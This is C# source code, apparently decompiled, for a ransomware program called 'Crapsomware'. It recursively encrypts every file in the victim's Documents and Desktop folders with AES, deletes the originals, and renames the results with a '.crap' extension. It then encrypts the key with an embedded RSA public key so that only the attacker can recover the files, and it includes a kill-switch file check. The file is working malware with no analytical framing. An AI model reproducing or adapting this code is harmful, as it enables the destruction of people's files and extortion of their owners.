using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Crapsomware;

internal static class Program
{
	public static string ext = "crap";

	public static Random r = new Random();

	public static string password = Convert.ToBase64String(GenerateRandomSalt());

	public static byte[] PublicKey = Convert.FromBase64String("z+p5DSsAF7rFvhbjou4qctd/XN0bRochAtat3haao/3tSEbCooUPLIqhkGTg0kXDOXG7jHzHgLCSMJUiiQINr0ezQE0am6n5y/hgNYW1G9E0UJM8XPtUwZZI15QCK0z2sgSWNB6SDhzznBPtzqwp49zip+PEDNJQgFTqNbvxvJ0=");

	public static byte[] Exponent = Convert.FromBase64String("AQAB");

	public static byte[] hash;

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	public static void FileEncrypt(string inputFile, string password)
	{
		try
		{
			byte[] array = GenerateRandomSalt();
			FileStream fileStream = new FileStream(inputFile + "." + ext, FileMode.Create);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CFB;
			fileStream.Write(array, 0, array.Length);
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
				{
					cryptoStream.Write(array2, 0, count);
				}
				fileStream2.Close();
				File.Delete(inputFile);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
			finally
			{
				cryptoStream.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			byte[] array = new byte[32];
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.Read(array, 0, array.Length);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
				{
					fileStream2.Write(array2, 0, count);
				}
			}
			catch
			{
			}
			try
			{
				cryptoStream.Close();
				File.Delete(inputFile);
			}
			catch
			{
			}
			finally
			{
				fileStream2.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static IEnumerable<string> Traverse(string rootDirectory)
	{
		try
		{
			IEnumerable<string> files = Enumerable.Empty<string>();
			IEnumerable<string> directories = Enumerable.Empty<string>();
			try
			{
				FileIOPermission permission = new FileIOPermission((FileIOPermissionAccess)8, rootDirectory);
				((CodeAccessPermission)permission).Demand();
				files = Directory.GetFiles(rootDirectory);
				directories = Directory.GetDirectories(rootDirectory);
			}
			catch
			{
				rootDirectory = null;
			}
			if (rootDirectory != null)
			{
				yield return rootDirectory;
			}
			foreach (string item in files)
			{
				yield return item;
			}
			IEnumerable<string> subdirectoryItems = directories.SelectMany(Traverse);
			foreach (string item2 in subdirectoryItems)
			{
				yield return item2;
			}
		}
		finally
		{
		}
	}

	public static IEnumerable<string> Files()
	{
		string[] paths = new string[2]
		{
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Personal", "%USERPROFILE%\\Documents"),
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Desktop", "%USERPROFILE%\\Desktop")
		};
		string[] array = paths;
		foreach (string dir in array)
		{
			foreach (string file in Traverse(dir))
			{
				if (file != Process.GetCurrentProcess().MainModule!.FileName)
				{
					yield return file;
				}
			}
		}
	}

	public static void Decrypt()
	{
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		foreach (string item in Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + ext)
			{
				FileDecrypt(item, item.Substring(0, item.Length - (ext.Length + 1)), password);
			}
		}
		MessageBox.Show("Decryption done!", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	public static void Encrypt()
	{
		foreach (string item in Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) != "." + ext && Path.GetFileName(item) != "desktop.ini" && Path.GetFileName(item) != "Thumbs.db")
			{
				FileEncrypt(item, password);
			}
		}
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		if (File.Exists("C:\\protect.dat"))
		{
			Process.GetCurrentProcess().Kill();
			Application.Exit();
		}
		Encrypt();
		hash = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
		RSAParameters parameters = default(RSAParameters);
		parameters.Modulus = PublicKey;
		parameters.Exponent = Exponent;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(parameters);
		password = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(password), fOAEP: false));
		Application.Run((Form)(object)new Form1());
	}
}
